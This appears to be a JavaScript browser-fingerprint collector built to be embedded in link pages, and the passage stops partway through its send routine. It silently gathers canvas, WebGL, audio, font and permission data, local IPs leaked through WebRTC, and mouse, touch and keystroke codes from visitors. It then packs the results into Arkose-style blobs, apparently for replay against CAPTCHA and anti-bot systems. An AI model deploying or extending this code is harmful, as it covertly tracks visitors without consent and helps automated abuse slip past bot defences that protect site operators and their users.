/**
 * BEAST Fingerprint Collector v2.0
 * Captures EVERY signal checked by: Arkose/FunCaptcha (140 keys), hCaptcha (42 components),
 * FingerprintJS Pro v4 (41 components), reCAPTCHA/BotGuard, Pinterest Sardine/Sift
 *
 * Total: 200+ unique signals across all major anti-bot systems
 * Inspired by: Fr0st3h/BDALogger, Implex-ltd/FingerprintCollector, pagpeter/TrackMe
 */
(function () {
  "use strict";

  const COLLECT_URL = "/api/collect";
  const BEHAVIORAL_URL = "/api/behavioral";
  const CHALLENGE_URL = "/api/challenge";
  const COLLECT_DURATION = 10000;

  const behav = { mouse: [], keyboard: [], scroll: [], touch: [], focus: [], click: [], resize: [] };
  const startTime = performance.now();
  function ts() { return Math.round(performance.now() - startTime); }
  function safe(fn, fb) { try { return fn(); } catch { return fb !== undefined ? fb : null; } }

  async function sha256Hex(text) {
    try {
      const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
      return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, "0")).join("");
    } catch { return null; }
  }

  /* ═══════ 1. NAVIGATOR (Arkose+hCaptcha+FPJS+Sift) ═══════ */
  function collectNavigator() {
    const n = navigator;
    const r = {
      userAgent: n.userAgent, appVersion: n.appVersion, appCodeName: n.appCodeName,
      appName: n.appName, platform: n.platform, product: n.product,
      productSub: n.productSub, vendor: n.vendor, vendorSub: n.vendorSub,
      language: n.language, languages: [...(n.languages || [])],
      cookieEnabled: n.cookieEnabled, doNotTrack: n.doNotTrack,
      maxTouchPoints: n.maxTouchPoints || 0, hardwareConcurrency: n.hardwareConcurrency || 0,
      deviceMemory: n.deviceMemory || null, pdfViewerEnabled: safe(() => n.pdfViewerEnabled),
      webdriver: !!n.webdriver, oscpu: n.oscpu || null, cpuClass: n.cpuClass || null,
      onLine: n.onLine, javaEnabled: safe(() => n.javaEnabled(), false),
      plugins_undefined: typeof n.plugins === "undefined",
      plugins: [], mimeTypes: [],
    };
    if (n.plugins) for (let i = 0; i < n.plugins.length; i++) {
      const p = n.plugins[i], mimes = [];
      for (let j = 0; j < (p.length || 0); j++) mimes.push({ type: p[j]?.type, suffixes: p[j]?.suffixes });
      r.plugins.push({ name: p.name, filename: p.filename, description: p.description, mimes });
    }
    if (n.mimeTypes) for (let i = 0; i < n.mimeTypes.length; i++) r.mimeTypes.push({ type: n.mimeTypes[i]?.type, suffixes: n.mimeTypes[i]?.suffixes });
    if (n.userAgentData) r.userAgentData = { brands: safe(() => n.userAgentData.brands?.map(b => ({ brand: b.brand, version: b.version })), []), mobile: safe(() => n.userAgentData.mobile, false), platform: safe(() => n.userAgentData.platform) };
    if (n.connection) r.connection = { downlink: n.connection.downlink, downlinkMax: safe(() => n.connection.downlinkMax, -1), effectiveType: n.connection.effectiveType, rtt: n.connection.rtt, saveData: n.connection.saveData || false, type: n.connection.type || null };
    return r;
  }

  /* ═══════ 2. SCREEN (Arkose+hCaptcha+FPJS) ═══════ */
  function collectScreen() {
    const s = screen;
    return {
      width: s.width, height: s.height, availWidth: s.availWidth, availHeight: s.availHeight,
      colorDepth: s.colorDepth, pixelDepth: s.pixelDepth,
      availLeft: s.availLeft || 0, availTop: s.availTop || 0,
      orientation: safe(() => ({ type: s.orientation.type, angle: s.orientation.angle })),
      innerWidth: window.innerWidth, innerHeight: window.innerHeight,
      outerWidth: window.outerWidth, outerHeight: window.outerHeight,
      screenX: window.screenX, screenY: window.screenY,
      devicePixelRatio: window.devicePixelRatio,
      screenFrame: [s.availTop || 0, s.width - s.availWidth - (s.availLeft || 0), s.height - s.availHeight - (s.availTop || 0), s.availLeft || 0],
    };
  }

  /* ═══════ 3. CANVAS (Arkose:f,CFP | hCaptcha:canvas_hash | FPJS:canvas) ═══════ */
  async function collectCanvas() {
    const r = { supported: false };
    try {
      const c = document.createElement("canvas"); c.width = 280; c.height = 60;
      const ctx = c.getContext("2d"); if (!ctx) return r; r.supported = true;
      ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 62, 20);
      ctx.fillStyle = "#069"; ctx.font = "11pt Arial"; ctx.fillText("Cwm fjordbank glyphs vext quiz, \u{1F603}", 2, 15);
      ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.font = "18pt Arial"; ctx.fillText("Cwm fjordbank glyphs vext quiz, \u{1F603}", 4, 45);
      ctx.globalCompositeOperation = "multiply";
      ctx.fillStyle = "rgb(255,0,255)"; ctx.beginPath(); ctx.arc(50, 50, 50, 0, Math.PI * 2); ctx.fill();
      ctx.fillStyle = "rgb(0,255,255)"; ctx.beginPath(); ctx.arc(100, 50, 50, 0, Math.PI * 2); ctx.fill();
      ctx.fillStyle = "rgb(255,255,0)"; ctx.beginPath(); ctx.arc(75, 100, 50, 0, Math.PI * 2); ctx.fill();
      ctx.globalCompositeOperation = "source-over";
      const grad = ctx.createLinearGradient(0, 0, 280, 0);
      grad.addColorStop(0, "red"); grad.addColorStop(0.5, "green"); grad.addColorStop(1, "blue");
      ctx.fillStyle = grad; ctx.fillRect(0, 0, 280, 5);
      r.dataURL = c.toDataURL("image/png"); r.dataURLHash = await sha256Hex(r.dataURL);
      const imgData = ctx.getImageData(0, 0, 280, 60);
      r.pixelHash = await sha256Hex(Array.from(imgData.data.slice(0, 1000)).join(","));
      try { const wc = document.createElement("canvas"); wc.width = 50; wc.height = 50; const gl = wc.getContext("webgl"); if (gl) { gl.clearColor(0.2, 0.4, 0.6, 1); gl.clear(gl.COLOR_BUFFER_BIT); r.webglCanvasHash = await sha256Hex(wc.toDataURL()); } } catch {}
    } catch (e) { r.error = e.message; }
    return r;
  }

  /* ═══════ 4. WEBGL COMPLETE (Arkose: ALL shader precision params) ═══════ */
  function collectWebGL() {
    const r = { supported: false, supported2: false };
    try {
      const c = document.createElement("canvas");
      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if (!gl) return r; r.supported = true;
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      r.vendor = gl.getParameter(gl.VENDOR); r.renderer = gl.getParameter(gl.RENDERER);
      r.unmaskedVendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null;
      r.unmaskedRenderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null;
      r.version = gl.getParameter(gl.VERSION);
      r.shadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
      r.aliasedLineWidthRange = Array.from(gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE));
      r.aliasedPointSizeRange = Array.from(gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE));
      r.antialias = gl.getContextAttributes()?.antialias || false;
      r.bits = [gl.getParameter(gl.RED_BITS), gl.getParameter(gl.GREEN_BITS), gl.getParameter(gl.DEPTH_BITS), gl.getParameter(gl.ALPHA_BITS), gl.getParameter(gl.BLUE_BITS), gl.getParameter(gl.STENCIL_BITS)].join(",");
      r.maxParams = [gl.getParameter(gl.MAX_VERTEX_ATTRIBS), gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS), gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS) || 0, gl.getParameter(gl.MAX_VARYING_VECTORS), gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS) || 0, gl.getParameter(gl.MAX_TEXTURE_SIZE), gl.getParameter(gl.MAX_RENDERBUFFER_SIZE), gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE), gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS), gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS), gl.getParameter(gl.MAX_VIEWPORT_DIMS)?.[0] || 0].join(",");
      r.maxViewportDims = Array.from(gl.getParameter(gl.MAX_VIEWPORT_DIMS));
      const exts = gl.getSupportedExtensions() || [];
      r.extensions = exts.join(";"); r.extensionsList = exts;
      function sp(st, pt) { try { const f = gl.getShaderPrecisionFormat(st, pt); return f ? `${f.rangeMin},${f.rangeMax},${f.precision}` : "0,0,0"; } catch { return "0,0,0"; } }
      r.vsfParams = [sp(gl.VERTEX_SHADER, gl.HIGH_FLOAT), sp(gl.VERTEX_SHADER, gl.MEDIUM_FLOAT), sp(gl.VERTEX_SHADER, gl.LOW_FLOAT)].join(",");
      r.vsiParams = [sp(gl.VERTEX_SHADER, gl.HIGH_INT), sp(gl.VERTEX_SHADER, gl.MEDIUM_INT), sp(gl.VERTEX_SHADER, gl.LOW_INT)].join(",");
      r.fsfParams = [sp(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT), sp(gl.FRAGMENT_SHADER, gl.MEDIUM_FLOAT), sp(gl.FRAGMENT_SHADER, gl.LOW_FLOAT)].join(",");
      r.fsiParams = [sp(gl.FRAGMENT_SHADER, gl.HIGH_INT), sp(gl.FRAGMENT_SHADER, gl.MEDIUM_INT), sp(gl.FRAGMENT_SHADER, gl.LOW_INT)].join(",");
      r.maxAnisotropy = safe(() => { const e = gl.getExtension("EXT_texture_filter_anisotropic") || gl.getExtension("WEBKIT_EXT_texture_filter_anisotropic"); return e ? gl.getParameter(e.MAX_TEXTURE_MAX_ANISOTROPY_EXT) : null; });
      try { const gl2 = c.getContext("webgl2"); if (gl2) { r.supported2 = true; r.version2 = gl2.getParameter(gl2.VERSION); r.shadingLanguageVersion2 = gl2.getParameter(gl2.SHADING_LANGUAGE_VERSION); r.maxVertexUniformComponents = gl2.getParameter(gl2.MAX_VERTEX_UNIFORM_COMPONENTS); r.maxFragmentUniformComponents = gl2.getParameter(gl2.MAX_FRAGMENT_UNIFORM_COMPONENTS); r.max3dTextureSize = gl2.getParameter(gl2.MAX_3D_TEXTURE_SIZE); r.maxArrayTextureLayers = gl2.getParameter(gl2.MAX_ARRAY_TEXTURE_LAYERS); r.maxColorAttachments = gl2.getParameter(gl2.MAX_COLOR_ATTACHMENTS); r.maxDrawBuffers = gl2.getParameter(gl2.MAX_DRAW_BUFFERS); r.extensions2 = (gl2.getSupportedExtensions() || []).join(";"); } } catch {}
    } catch (e) { r.error = e.message; }
    return r;
  }

  /* ═══════ 5. AUDIO (Arkose:audio_fingerprint | FPJS:audio) ═══════ */
  async function collectAudio() {
    const r = { supported: false };
    try {
      const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!AC) return r; r.supported = true;
      const ctx = new AC(1, 44100, 44100);
      const osc = ctx.createOscillator(); osc.type = "triangle"; osc.frequency.setValueAtTime(10000, ctx.currentTime);
      const comp = ctx.createDynamicsCompressor();
      comp.threshold.setValueAtTime(-50, ctx.currentTime); comp.knee.setValueAtTime(40, ctx.currentTime);
      comp.ratio.setValueAtTime(12, ctx.currentTime); comp.attack.setValueAtTime(0, ctx.currentTime);
      comp.release.setValueAtTime(0.25, ctx.currentTime);
      osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
      const buf = await ctx.startRendering(); const data = buf.getChannelData(0);
      let sum = 0; for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
      r.fingerprint = sum; r.fingerprintHash = await sha256Hex(sum.toString());
      try { const live = new (window.AudioContext || window.webkitAudioContext)(); r.sampleRate = live.sampleRate; r.baseLatency = live.baseLatency || null; r.outputLatency = live.outputLatency || null; r.channelCount = live.destination.maxChannelCount; live.close(); } catch {}
    } catch (e) { r.error = e.message; }
    return r;
  }

  /* ═══════ 6. MEDIA CODECS (Arkose:audio_codecs,video_codecs) ═══════ */
  function collectCodecs() {
    const v = document.createElement("video"), a = document.createElement("audio");
    return {
      audio: { ogg: safe(() => a.canPlayType('audio/ogg; codecs="vorbis"'), ""), mp3: safe(() => a.canPlayType("audio/mpeg"), ""), wav: safe(() => a.canPlayType('audio/wav; codecs="1"'), ""), m4a: safe(() => a.canPlayType("audio/x-m4a"), ""), aac: safe(() => a.canPlayType("audio/aac"), ""), flac: safe(() => a.canPlayType("audio/flac"), ""), opus: safe(() => a.canPlayType('audio/ogg; codecs="opus"'), ""), webm: safe(() => a.canPlayType('audio/webm; codecs="opus"'), "") },
      video: { ogg: safe(() => v.canPlayType('video/ogg; codecs="theora"'), ""), h264: safe(() => v.canPlayType('video/mp4; codecs="avc1.42E01E"'), ""), webm: safe(() => v.canPlayType('video/webm; codecs="vp8, vorbis"'), ""), vp9: safe(() => v.canPlayType('video/webm; codecs="vp9"'), ""), av1: safe(() => v.canPlayType('video/mp4; codecs="av01.0.01M.08"'), ""), hevc: safe(() => v.canPlayType('video/mp4; codecs="hev1.1.6.L93.B0"'), ""), mpeg4v: safe(() => v.canPlayType('video/mp4; codecs="mp4v.20.8"'), ""), mpeg4a: safe(() => v.canPlayType('audio/mp4; codecs="mp4a.40.2"'), ""), theora: safe(() => v.canPlayType('video/ogg; codecs="theora"'), "") },
    };
  }

  /* ═══════ 7. FONTS (FPJS:fonts | Arkose:JSF) ═══════ */
  function collectFonts() {
    const bases = ["monospace", "sans-serif", "serif"];
    const test = ["Andale Mono","Arial","Arial Black","Arial Hebrew","Arial MT","Arial Narrow","Arial Rounded MT Bold","Arial Unicode MS","Bitstream Vera Sans Mono","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans","Comic Sans MS","Consolas","Courier","Courier New","Geneva","Georgia","Helvetica","Helvetica Neue","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Grande","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monaco","Monotype Corsiva","MS Gothic","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3","Abadi MT Condensed Light","Academy Engraved LET","ADOBE CASLON PRO","Adobe Garamond","Agency FB","Aharoni","Amazone BT","American Typewriter","Amienne","Antique Olive","Apple Chancery","Apple Color Emoji","Apple SD Gothic Neo","Arrus BT","Aurora Cn BT"];
    const str = "mmmmmmmmmmlli", sz = "72px", body = document.body, span = document.createElement("span");
    span.style.fontSize = sz; span.style.position = "absolute"; span.style.left = "-9999px"; span.style.top = "-9999px"; span.innerHTML = str;
    const bl = {};
    for (const b of bases) { span.style.fontFamily = b; body.appendChild(span); bl[b] = { w: span.offsetWidth, h: span.offsetHeight }; body.removeChild(span); }
    const detected = [];
    for (const f of test) { let found = false; for (const b of bases) { span.style.fontFamily = `'${f}',${b}`; body.appendChild(span); if (span.offsetWidth !== bl[b].w || span.offsetHeight !== bl[b].h) found = true; body.removeChild(span); if (found) break; } if (found) detected.push(f); }
    return { detected, count: detected.length };
  }

  /* ═══════ 8. CSS MEDIA QUERIES (Arkose:f9bf2db | FPJS:colorGamut etc) ═══════ */
  function collectMediaQueries() {
    function mq(q) { try { return window.matchMedia(q).matches; } catch { return null; } }
    function mqV(qs) { for (const [q, v] of qs) if (mq(q)) return v; return null; }
    return {
      prefersContrast: mqV([["(prefers-contrast: high)","high"],["(prefers-contrast: low)","low"],["(prefers-contrast: forced)","forced"],["(prefers-contrast: no-preference)","no-preference"]]),
      anyHover: mqV([["(any-hover: hover)","hover"],["(any-hover: none)","none"]]),
      anyPointer: mqV([["(any-pointer: fine)","fine"],["(any-pointer: coarse)","coarse"],["(any-pointer: none)","none"]]),
      pointer: mqV([["(pointer: fine)","fine"],["(pointer: coarse)","coarse"],["(pointer: none)","none"]]),
      hover: mqV([["(hover: hover)","hover"],["(hover: none)","none"]]),
      update: mqV([["(update: fast)","fast"],["(update: slow)","slow"],["(update: none)","none"]]),
      prefersReducedMotion: mq("(prefers-reduced-motion: reduce)"),
      prefersReducedTransparency: mq("(prefers-reduced-transparency: reduce)"),
      scripting: mqV([["(scripting: enabled)","enabled"],["(scripting: none)","none"]]),
      forcedColors: mq("(forced-colors: active)"),
      prefersColorScheme: mq("(prefers-color-scheme: dark)") ? "dark" : "light",
      colorGamut: mqV([["(color-gamut: rec2020)","rec2020"],["(color-gamut: p3)","p3"],["(color-gamut: srgb)","srgb"]]),
      invertedColors: mq("(inverted-colors: inverted)"),
      monochrome: mq("(monochrome)"),
      hdr: mq("(dynamic-range: high)"),
    };
  }

  /* ═══════ 9. MATH (Arkose:math_fingerprint) ═══════ */
  function collectMath() {
    const M = Math;
    return { tan: M.tan(-1e300), atan2_1: M.atan2(1, 2), atan2_2: M.atan2(2, 1), sin: M.sin(1), cos: M.cos(1), exp1: M.exp(1), exp10: M.exp(10), log2: M.log(2), log10: M.log(10), log2_17: safe(() => M.log2(17)), sqrt2: M.sqrt(2), powPI: M.pow(M.PI, -100), acosh: safe(() => M.acosh(1e308)), asinh: safe(() => M.asinh(1)), atanh: safe(() => M.atanh(0.5)), cbrt: safe(() => M.cbrt(100)), cosh: safe(() => M.cosh(1)), expm1: safe(() => M.expm1(1)), fround: safe(() => M.fround(M.PI)), hypot: safe(() => M.hypot(1, 2)), log1p: safe(() => M.log1p(10)), log10_7: safe(() => M.log10(7)), sinh: safe(() => M.sinh(1)), tanh: safe(() => M.tanh(1)), trunc: safe(() => M.trunc(M.PI)), sign: safe(() => M.sign(-5)), clz32: safe(() => M.clz32(1)), imul: safe(() => M.imul(0xffffffff, 5)) };
  }

  /* ═══════ 10. STORAGE ═══════ */
  function collectStorage() {
    return { localStorage: safe(() => { localStorage.setItem("_t", "1"); localStorage.removeItem("_t"); return true; }, false), sessionStorage: safe(() => { sessionStorage.setItem("_t", "1"); sessionStorage.removeItem("_t"); return true; }, false), indexedDB: !!window.indexedDB, openDatabase: !!window.openDatabase, cookieEnabled: navigator.cookieEnabled };
  }

  /* ═══════ 11. TIMING ═══════ */
  function collectTiming() {
    const r = {};
    const samples = []; for (let i = 0; i < 20; i++) samples.push(performance.now());
    const diffs = []; for (let i = 1; i < samples.length; i++) diffs.push(samples[i] - samples[i - 1]);
    r.perfNowPrecision = Math.min(...diffs.filter(d => d > 0)) || 0;
    if (performance.timing) { const t = performance.timing; r.navTiming = { connectEnd: t.connectEnd, domComplete: t.domComplete, domContentLoaded: t.domContentLoadedEventEnd, domInteractive: t.domInteractive, fetchStart: t.fetchStart, loadEventEnd: t.loadEventEnd, navigationStart: t.navigationStart, requestStart: t.requestStart, responseEnd: t.responseEnd, responseStart: t.responseStart }; }
    r.resourceCount = safe(() => performance.getEntriesByType("resource").length, 0);
    if (performance.memory) r.memory = { jsHeapSizeLimit: performance.memory.jsHeapSizeLimit, totalJSHeapSize: performance.memory.totalJSHeapSize, usedJSHeapSize: performance.memory.usedJSHeapSize };
    return r;
  }

  /* ═══════ 12. BOT DETECTION (hCaptcha:r_bot_score | Arkose:headless_*) ═══════ */
  function collectBotSignals() {
    const s = {};
    s.webdriver = !!navigator.webdriver;
    s.phantom = !!(window._phantom || window.__nightmare || window.phantom);
    s.selenium = !!(window._selenium || window.__selenium_evaluate || document.__selenium_unwrapped);
    s.nightmare = !!window.__nightmare;
    s.domAutomation = !!window.domAutomationController;
    s.cdc = !!(window.cdc_adoQpoasnfa76pfcZLmcfl_Array || window.cdc_adoQpoasnfa76pfcZLmcfl_Promise);
    s.cdpRuntime = safe(() => !!(window.Runtime || window.Debugger));
    s.toStringLength = safe(() => eval.toString().length, 0);
    s.errFirefox = safe(() => { try { null[0](); } catch (e) { return e.message?.length || 0; } }, null);
    s.chrome = !!window.chrome; s.chromeRuntime = !!(window.chrome?.runtime);
    s.frida = !!(window.Frida || window._frida);
    s.fakeBrowser = safe(() => { const ua = navigator.userAgent; if (ua.includes("Chrome") && !window.chrome) return true; if (ua.includes("Firefox") && !("InstallTrigger" in window)) return true; return false; }, false);
    s.fakeOS = safe(() => { const ua = navigator.userAgent, p = navigator.platform; if (ua.includes("Windows") && !p.includes("Win")) return true; if (ua.includes("Mac") && !p.includes("Mac")) return true; return false; }, false);
    let score = 0; const keys = [];
    if (s.webdriver) { score += 5; keys.push("webdriver"); }
    if (s.phantom) { score += 5; keys.push("phantom"); }
    if (s.selenium) { score += 5; keys.push("selenium"); }
    if (s.fakeBrowser) { score += 3; keys.push("fakeBrowser"); }
    if (s.fakeOS) { score += 3; keys.push("fakeOS"); }
    s.botScore = score; s.suspiciousKeys = keys;
    return s;
  }

  /* ═══════ 13. WINDOW PROPS (hCaptcha:unique_keys,common_keys) ═══════ */
  function collectWindowProperties() {
    const all = Object.getOwnPropertyNames(window);
    let hash = 0; for (const k of all) for (let i = 0; i < k.length; i++) hash = ((hash << 5) - hash + k.charCodeAt(i)) | 0;
    return {
      totalKeys: all.length, commonKeysHash: hash >>> 0,
      commonKeysTail: all.slice(-50).join(",").slice(0, 500),
      features: { performanceEntries: typeof performance.getEntries === "function", webAudio: !!(window.AudioContext || window.webkitAudioContext), webRTC: !!window.RTCPeerConnection, canvas2d: !!document.createElement("canvas").getContext("2d"), fetch: typeof fetch === "function", webGL: !!document.createElement("canvas").getContext("webgl"), webAssembly: typeof WebAssembly === "object" },
      historyLength: safe(() => history.length, 0), documentTitle: document.title,
      parentWinSame: window.parent === window,
      ancestorOrigins: safe(() => [...window.location.ancestorOrigins], []),
    };
  }

  /* ═══════ 14. PERMISSIONS ═══════ */
  async function collectPermissions() {
    const names = ["geolocation","notifications","push","midi","camera","microphone","background-fetch","background-sync","bluetooth","persistent-storage","accelerometer","gyroscope","magnetometer","clipboard-read","clipboard-write","screen-wake-lock","nfc","display-capture","idle-detection"];
    const r = {};
    for (const n of names) { try { r[n] = (await navigator.permissions.query({ name: n })).state; } catch { r[n] = "error"; } }
    return r;
  }

  /* ═══════ 15. WEBRTC (hCaptcha:webrtc_hash) ═══════ */
  async function collectWebRTC() {
    const r = { supported: false, localIPs: [] };
    try {
      if (!window.RTCPeerConnection) return r; r.supported = true;
      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      pc.createDataChannel("");
      await pc.setLocalDescription(await pc.createOffer());
      await new Promise(res => { const t = setTimeout(res, 3000); pc.onicecandidate = e => { if (!e.candidate) { clearTimeout(t); res(); return; } const ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if (ip && !r.localIPs.includes(ip[0])) r.localIPs.push(ip[0]); }; });
      pc.close();
    } catch {} return r;
  }

  /* ═══════ 16. EXTENDED APIs (Battery,Speech,Notifications,HDR,CSS) ═══════ */
  async function collectExtended() {
    const r = {};
    try { if (navigator.getBattery) { const b = await navigator.getBattery(); r.battery = { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime }; } } catch {}
    try { r.speechVoices = speechSynthesis.getVoices().map(v => ({ name: v.name, lang: v.lang, local: v.localService })); } catch {}
    r.notificationPermission = safe(() => Notification.permission, "default");
    r.gamepads = safe(() => navigator.getGamepads()?.length || 0, 0);
    r.bluetooth = "bluetooth" in navigator; r.usb = "usb" in navigator;
    r.clipboard = "clipboard" in navigator; r.fileSystem = "showOpenFilePicker" in window;
    r.serial = "serial" in navigator; r.hid = "hid" in navigator; r.xr = "xr" in navigator;
    try { if (navigator.storage?.estimate) { const e = await navigator.storage.estimate(); r.storageQuota = e.quota; r.storageUsage = e.usage; } } catch {}
    r.hdr = { supported: safe(() => window.matchMedia("(dynamic-range: high)").matches, false) };
    r.cssFeatures = {};
    for (const [n, rule] of [["grid","display: grid"],["flexbox","display: flex"],["container-queries","container-type: inline-size"],["subgrid","grid-template-columns: subgrid"],["color-mix","color: color-mix(in srgb, red 50%, blue)"]]) r.cssFeatures[n] = safe(() => CSS.supports(rule), false);
    return r;
  }

  /* ═══════ 17. TIMEZONE ═══════ */
  function collectTimezone() {
    return { offset: new Date().getTimezoneOffset(), intl: safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone), locale: safe(() => Intl.DateTimeFormat().resolvedOptions().locale) };
  }

  /* ═══════ 18. ARKOSE FE BUILDER ═══════ */
  function buildArkoseFE(fp) {
    const n = fp.navigator || {}, s = fp.screen || {}, st = fp.storage || {}, b = fp.botSignals || {}, f = fp.fonts || {};
    return [`DNT:${n.doNotTrack || "unknown"}`, `L:${n.language || "en-US"}`, `D:${s.colorDepth || 24}`, `PR:${s.devicePixelRatio || 1}`, `S:${s.width || 0},${s.height || 0}`, `AS:${s.availWidth || 0},${s.availHeight || 0}`, `TO:${fp.timezone?.offset || 0}`, `SS:${st.sessionStorage}`, `LS:${st.localStorage}`, `IDB:${st.indexedDB}`, `B:false`, `ODB:${st.openDatabase}`, `CPUC:${n.cpuClass || "unknown"}`, `PK:${n.platform || "unknown"}`, `CFP:${fp.canvas?.dataURLHash?.slice(0, 10) || "0"}`, `FR:${b.frida || false}`, `FOS:${b.fakeOS || false}`, `FB:${b.fakeBrowser || false}`, `JSF:${(f.detected || []).join(",")}`, `P:${(n.plugins || []).map(p => p.name).join(",")}`, `T:${n.maxTouchPoints || 0},${"ontouchstart" in window},${n.maxTouchPoints > 0}`, `H:${n.hardwareConcurrency || 0}`, `SWF:false`];
  }

  /* ═══════ 19. ARKOSE JSBD ═══════ */
  function buildArkoseJSBD() {
    return { HL: safe(() => history.length, 1), NCE: navigator.cookieEnabled, DT: document.title || "", NWD: String(!!navigator.webdriver), DMTO: (document.msMaxTouchPoints || 0) + 1, DOTO: ("ontouchstart" in document ? 1 : 0) + 1 };
  }

  /* ═══════ 20. BEHAVIORAL SETUP ═══════ */
  function setupBehavioral() {
    let last = null;
    document.addEventListener("mousemove", e => { const now = ts(), entry = { x: e.clientX, y: e.clientY, t: now }; if (last) { const dt = now - last.t; if (dt > 0) { entry.vx = (e.clientX - last.x) / dt; entry.vy = (e.clientY - last.y) / dt; entry.speed = Math.sqrt((e.clientX - last.x) ** 2 + (e.clientY - last.y) ** 2) / dt; } } last = entry; if (behav.mouse.length < 5000) behav.mouse.push(entry); }, { passive: true });
    document.addEventListener("mousedown", e => { if (behav.click.length < 500) behav.click.push({ x: e.clientX, y: e.clientY, button: e.button, t: ts() }); }, { passive: true });
    document.addEventListener("keydown", e => { if (behav.keyboard.length < 2000) behav.keyboard.push({ code: e.code, key: e.key.length === 1 ? "*" : e.key, t: ts() }); }, { passive: true });
    document.addEventListener("keyup", e => { if (behav.keyboard.length < 2000) behav.keyboard.push({ code: e.code, type: "up", t: ts() }); }, { passive: true });
    let ls = 0; window.addEventListener("scroll", () => { const now = ts(); if (now - ls > 50) { if (behav.scroll.length < 2000) behav.scroll.push({ x: window.scrollX, y: window.scrollY, t: now }); ls = now; } }, { passive: true });
    document.addEventListener("touchstart", e => { if (behav.touch.length < 2000) behav.touch.push({ type: "start", touches: [...e.touches].map(t => ({ x: t.clientX, y: t.clientY })), t: ts() }); }, { passive: true });
    document.addEventListener("touchmove", e => { if (behav.touch.length < 2000) behav.touch.push({ type: "move", touches: [...e.touches].map(t => ({ x: t.clientX, y: t.clientY })), t: ts() }); }, { passive: true });
    document.addEventListener("touchend", () => { if (behav.touch.length < 2000) behav.touch.push({ type: "end", t: ts() }); }, { passive: true });
    window.addEventListener("focus", () => { if (behav.focus.length < 500) behav.focus.push({ type: "focus", t: ts() }); });
    window.addEventListener("blur", () => { if (behav.focus.length < 500) behav.focus.push({ type: "blur", t: ts() }); });
    window.addEventListener("resize", () => { if (behav.resize.length < 100) behav.resize.push({ w: window.innerWidth, h: window.innerHeight, t: ts() }); });
  }

  /* ═══════ 21. CHALLENGE SOLVER ═══════ */
  async function solveChallenge() {
    try {
      const resp = await fetch(CHALLENGE_URL); const { token, difficulty } = await resp.json();
      const prefix = "0".repeat(difficulty || 4); let nonce = 0;
      while (nonce < 1e7) { const hash = await sha256Hex(`${token}:${nonce}`); if (hash?.startsWith(prefix)) return { token, nonce, hash }; nonce++; }
    } catch {} return null;
  }

  /* ═══════ MAIN COLLECT ═══════ */
  async function collect() {
    const fp = {};
    fp.navigator = collectNavigator(); fp.screen = collectScreen();
    fp.webgl = collectWebGL(); fp.codecs = collectCodecs(); fp.fonts = collectFonts();
    fp.mediaQueries = collectMediaQueries(); fp.math = collectMath();
    fp.storage = collectStorage(); fp.timing = collectTiming();
    fp.botSignals = collectBotSignals(); fp.windowProps = collectWindowProperties();
    fp.timezone = collectTimezone();
    const [canvas, audio, perms, webrtc, ext] = await Promise.all([collectCanvas(), collectAudio(), collectPermissions(), collectWebRTC(), collectExtended()]);
    fp.canvas = canvas; fp.audio = audio; fp.permissions = perms; fp.webrtc = webrtc; fp.extended = ext;
    fp.arkoseFE = buildArkoseFE(fp); fp.arkoseJSBD = buildArkoseJSBD();
    fp.behavioral = { mouse: behav.mouse.length, keyboard: behav.keyboard.length, scroll: behav.scroll.length, touch: behav.touch.length, click: behav.click.length, focus: behav.focus.length, collectionDurationMs: ts() };
    fp._hp = safe(() => document.getElementById("hp_email")?.value || "", "");
    fp._meta = { collectedAt: new Date().toISOString(), url: window.location.href, referrer: document.referrer, collectionDurationMs: ts() };
    return fp;
  }

  /* ═══════ SEND ═══════ */
  // Resolve script tag for link_code and endpoint
  function getScriptCfg() {
    try {
      const cur = document.currentScript || (function(){var a=document.getElementsByTagName('script');for(var i=a.length-1;i>=0;i--){if(a[i].src&&a[i].src.indexOf('embed.js')>-1)return a[i];}return a[a.length-1];})();
      return {
        link_code: cur ? cur.getAttribute('data-id') : null,
        endpoint: (cur && cur.getAttribute('data-endpoint')) || location.origin,
      };
    } catch { return { link_code: null, endpoint: location.origin }; }
  }

  async function send(fp) {
    const cfg = getScriptCfg();
    const challenge = await solveChallenge();
    const payload = {
      fingerprint: fp,
      behavioral: behav,
      challenge,
      link_code: cfg.link_code,
      meta: { collectedAt: new Date().toISOString(), url: location.href, referrer: document.referrer, durationMs: ts() },
    };
    const body = JSON.stringify(payload);
    try {
      // Prefer sendBeacon — survives unload (user may close tab post-redirect)
